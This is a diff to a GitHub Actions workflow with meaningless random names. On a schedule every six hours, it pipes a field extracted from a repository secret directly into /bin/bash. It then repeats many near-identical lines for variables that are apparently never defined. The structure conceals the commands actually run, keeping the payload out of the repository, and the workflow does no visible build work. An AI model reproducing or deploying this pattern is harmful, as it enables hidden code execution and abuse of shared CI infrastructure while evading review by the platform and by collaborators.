@@ -1,35 +1,29 @@
 name: moshumin6712
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '32 5/6 * * *'
-
+    - cron: '1 3/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: moshumin6712
         env:
-          okdu8302: ${{ secrets.okdu8302 }}
+          k1: ${{ secrets.k1 }}
         run: |
-          echo $okdu8302 | jq -r .iq27 | /bin/bash
-          echo $foa69 | jq -r .tlvnm72228 | /bin/bash
-          echo $ivaes13 | jq -r .pqxv430 | /bin/bash
-          echo $aq0227 | jq -r .pm97 | /bin/bash
-          echo $rs3886 | jq -r .ifduj75987 | /bin/bash
-          echo $ezf1 | jq -r .zixrq020 | /bin/bash
-          echo $erp1 | jq -r .ph33326 | /bin/bash
-          echo $jv4 | jq -r .ae6 | /bin/bash
-          echo $x343 | jq -r .wk6 | /bin/bash
-          echo $aux45671 | jq -r .d30702 | /bin/bash
-          echo $b84 | jq -r .hffpx7111 | /bin/bash
-          echo $vm368 | jq -r .iw22 | /bin/bash
-          echo $x81 | jq -r .a4 | /bin/bash
-          echo $rra66726 | jq -r .pni19101 | /bin/bash
-          echo $kwysa092 | jq -r .kxfcd136 | /bin/bash
-          echo $gvz7 | jq -r .cc70430 | /bin/bash
-          echo $u0689 | jq -r .jkyum238 | /bin/bash
-          echo $tga7 | jq -r .wlw9096 | /bin/bash
+          echo $k1 | jq -r .br00702 | /bin/bash
+          echo $wlgs9 | jq -r .aqlfu81180 | /bin/bash
+          echo $xelrh51 | jq -r .b41 | /bin/bash
+          echo $rpc97144 | jq -r .weh5365 | /bin/bash
+          echo $ek53096 | jq -r .kys7 | /bin/bash
+          echo $gf32442 | jq -r .x544 | /bin/bash
+          echo $m25 | jq -r .gtr30 | /bin/bash
+          echo $gocsy9872 | jq -r .k865 | /bin/bash
+          echo $yjsr70 | jq -r .t92 | /bin/bash
+          echo $nhh6294 | jq -r .l1195 | /bin/bash
+          echo $fvnb93 | jq -r .pxbil5 | /bin/bash
+          echo $vcee58390 | jq -r .eifc16870 | /bin/bash
+          echo $vo96608 | jq -r .wqyv051 | /bin/bash
 
